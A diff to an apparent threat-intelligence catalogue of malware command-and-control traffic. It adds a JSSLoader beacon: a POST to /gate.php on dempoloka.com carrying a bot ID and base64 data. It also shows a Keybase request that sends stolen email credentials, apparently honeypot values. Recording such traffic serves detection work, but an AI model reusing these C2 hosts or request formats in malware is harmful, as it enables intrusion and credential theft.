@@ -701,6 +701,21 @@ Server: LiteSpeed
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/isrstealer.png "ISRStealer")
 
+#### JSSLoader
+~~~
+POST /gate.php?bot_id=JenniferPCJENNIFERPCVMware564db87746ebb934e9e0b94b413682b8 HTTP/1.1
+Content-Type: application/json
+Host: dempoloka.com
+Content-Length: 242
+Expect: 100-continue
+Connection: Keep-Alive
+
+AAAAAA==
+AQAAAA==
+VGhlIGlucHV0IGlzIG5vdCBhIHZhbGlkIEJhc2UtNjQgc3RyaW5nIGFzIGl0IGNvbnRhaW5zIGEgbm9uLWJhc2UgNjQgY2hhcmFjdGVyLCBtb3JlIHRoYW4gdHdvIHBhZGRpbmcgY2hhcmFjdGVycywgb3IgYW4gaWxsZWdhbCBjaGFyYWN0ZXIgYW1vbmcgdGhlIHBhZGRpbmcgY2hhcmFjdGVycy4g
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jssloader.png "JSSLoader")
+
 #### Keybase
 ~~~
 GET /panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356 HTTP/1.1
